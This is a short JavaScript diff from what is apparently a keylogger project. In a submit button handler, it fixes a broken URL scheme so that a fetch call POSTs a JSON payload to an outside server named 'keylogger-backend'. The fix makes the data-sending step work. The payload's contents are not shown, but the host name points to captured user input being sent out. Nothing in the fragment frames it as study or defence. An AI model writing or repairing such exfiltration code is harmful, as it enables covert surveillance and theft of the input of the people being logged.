@@ -122,7 +122,7 @@ submitBtn.onclick = async () => {
   };
 
   try {
-    const response = await fetch("httpls://keylogger-backend.vercel.app/api/submit", {
+    const response = await fetch("https://keylogger-backend.vercel.app/api/submit", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload)
